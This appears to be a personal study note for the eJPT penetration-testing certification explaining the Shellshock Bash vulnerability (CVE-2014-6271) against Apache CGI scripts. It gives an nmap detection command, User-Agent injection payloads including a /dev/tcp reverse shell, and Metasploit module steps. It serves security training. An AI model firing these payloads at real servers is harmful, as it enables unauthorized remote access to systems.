#eJPT #INE #ShellShock #CGI

# What is ShellShock

Shellshock (CVE-2014-6271) is the name given to a family of **vulnerabilities in the Bash shell** (since V1.3) that *allow an attacker to execute remote arbitrary commands via Bash*, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

● The Shellshock vulnerability was *discovered by Stéphane Chazelas on the 12th of September 2014* and was made **public on the 24th of September 2014.**

● Bash is a \*Nix shell that is part of the GNU project and is the **default** shell for most Linux distributions.

**This vulnerability only affects Linux**

● In the context of remote exploitation, Apache web servers configured to run \*CGI scripts or .sh scripts are also vulnerable to this attack.

# Shellshock Exploitation Basics

Caused by a vulnerability in Bash, whereby *Bash mistakenly executes trailing commands after a series of characters*: () {:;};.

● In order to exploit this vulnerability, you will need to l**ocate an input vector or script that allows you to communicate with Bash.**

● In the context of an Apache web server, we can **utilize any legitimate CGI scripts** accessible on the web server.

● Whenever a CGI script is executed, *the web server will initiate a new process and run the CGI script with Bash.*

# Exploitation

### Manual Exploitation

1. Check if target is running Apache

2. Check if Apache is vulnerable using nmap script
```bash
nmap TARGET --script=http-shellshock --script-args "http-shellshock.uri=/PATH.cgi"
```

3. If vulnerable, use Burp and modify user agent of .cgi script request
```HTTP
User-Agent:() { :; }; echo; /bin/bash -c 'ls -la'
```

4. Set up listener on Attack machine, and connect with target
```HTTP
User-Agent:() { :; }; echo; /bin/bash -c 'bash -i>&/dev/tcp/IP/PORT 0>&1'
```


### Metasploit Exploitation

1. Use exploit module 

```bash
msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

2. Set RHOST, TARGETURI...
```bash
msf> set RHOST TARGET
msf> set TARGETURI PATH_TO_CGI.cgi
```

3. Exploit

---
#### Definitions

- *Nix* : Unix Based operating system
- *CGI (Common Gateway Interface)* :  Scripts used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.